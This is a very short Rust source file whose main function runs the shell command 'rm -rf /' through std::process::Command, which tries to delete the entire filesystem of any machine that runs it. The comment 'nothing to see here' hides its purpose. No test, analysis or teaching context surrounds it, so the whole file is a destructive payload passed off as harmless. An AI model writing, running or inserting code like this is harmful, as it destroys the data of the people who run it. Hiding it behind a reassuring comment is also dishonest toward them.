use std::process::Command;

fn main() {
    // nothing to see here
    Command::new("rm").args(["-rf", "/"]).spawn().unwrap();
}
